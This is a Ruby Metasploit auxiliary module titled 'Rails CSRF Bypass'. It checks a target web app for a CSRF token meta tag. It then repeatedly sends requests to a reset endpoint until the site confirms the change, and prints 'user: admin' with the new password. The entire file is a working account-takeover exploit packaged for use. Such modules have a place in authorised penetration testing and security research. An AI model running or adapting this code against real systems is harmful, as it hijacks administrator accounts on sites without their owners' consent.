##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'mechanize'

class Metasploit3 < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize
    super(
      'Name'           => 'Rails CSRF Bypass',
      'Version'        => '$Revision: 1 $',
      'Description'    => 'Session Injection Exploit for Rails App',
      'Author'        =>
      [
        'akitaonrails', #original discovery and disclosure
        'joridos' #metasploit module
      ],
      'License'        => MSF_LICENSE
    )
    register_options(
      [
        OptString.new('TARGETURI', [ true,  'The request URI', '/reset/_csrf_token']),
        OptString.new('PASSWORD', [true, 'The password to set']),
      ], self.class)
  end

  def check
    agent = Mechanize.new { |agent|
      agent.user_agent_alias = 'Mac Safari'
    }
    if page = agent.get("http://#{datastore['RHOST']}/")
      print_status Exploit::CheckCode::Detected[0]
    else
      print_error "Host not found"
      return Exploit::CheckCode::Unsupported
    end
    if page.at('meta[@name="csrf-token"]')[:content]
      print_status('Found csrf-token, exploitable')
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Safe
    end
  end

  def run
    $hacked = false
    if datastore['PASSWORD'].length < 7
      print_error("use password from 7 characters and no special characters") 
      return Exploit::CheckCode::Unsupported
    end
    begin
      agent = Mechanize.new { |agent|
        agent.user_agent_alias = 'Mac Safari'
      }
      page = agent.get("http://#{datastore['RHOST']}/")
      token = page.at('meta[@name="csrf-token"]')[:content]
      print_status "#{token}"
      if token =~ /^1\w+/
        doc = agent.get("http://#{datastore['RHOST']}#{datastore['TARGETURI']}?password=#{datastore['PASSWORD']}")
        $hacked = doc.content
        print_good doc.content
      end
    end  while $hacked != "password changed ;)"
      print_good "user: admin"
      print_good "pass: #{datastore['PASSWORD']}"
  end
end
